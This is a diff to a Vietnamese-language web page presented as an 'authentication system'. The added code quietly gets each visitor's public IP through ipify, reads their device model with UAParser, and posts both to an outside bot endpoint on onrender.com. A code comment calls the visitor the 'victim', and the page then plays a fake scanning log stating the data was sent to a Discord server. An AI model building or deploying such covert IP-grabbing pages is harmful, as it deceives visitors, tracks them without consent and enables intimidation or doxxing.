@@ -6,7 +6,7 @@
     <title>Hệ thống Xác thực</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.38/ua-parser.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/2.0.0/ua-parser.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;1,300&family=Josefin+Sans:wght@200;300;400&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -435,19 +435,48 @@
         }
 
        async function scan(ans) {
+    // 1. Kiểm tra thư viện UAParser đã tải xong chưa
+    if (typeof UAParser === 'undefined') {
+        console.error("Thư viện UAParser chưa được tải!");
+        return;
+    }
+
     const parser = new UAParser();
     const result = parser.getResult();
     
-    // Thay vì dùng regex thủ công, hãy dùng kết quả từ thư viện UAParser
-    let deviceName = "Desktop"; // Mặc định
-    
+    // Logic lấy tên thiết bị
+    let deviceName = "Desktop";
     if (result.device.type === 'mobile' || result.device.type === 'tablet') {
         deviceName = `${result.device.vendor || ''} ${result.device.model || 'Mobile Device'}`;
     } else if (result.os.name === 'iOS' || result.os.name === 'Android') {
         deviceName = `${result.os.name} Device`;
     }
 
-    // Sau đó gửi deviceName này đi...
+    // 2. Lấy IP
+    let userIp = "Hidden";
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        userIp = ipData.ip;
+    } catch (e) {
+        console.log("Không lấy được IP");
+    }
+
+    // 3. Gửi dữ liệu về bot (Phần này bạn đã bị xóa mất)
+    await fetch('https://mybot-lfij.onrender.com/log-visitor', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+            ip: userIp, 
+            device: deviceName 
+        })
+    });
+
+    // 4. Hiệu ứng log hiển thị cho nạn nhân
+    document.getElementById('log').innerHTML = '';
+    addLine('<span class="log-scanning">Đang kết nối đến thiết bị...</span>', '', 0);
+    addLine('<span class="log-result">Đã xác định: ' + deviceName + '</span>', '', 1500);
+    addLine('<span class="log-discord">Đã gửi dữ liệu về máy chủ Discord.</span>', '', 3000);
 }
     </script>
 </body>
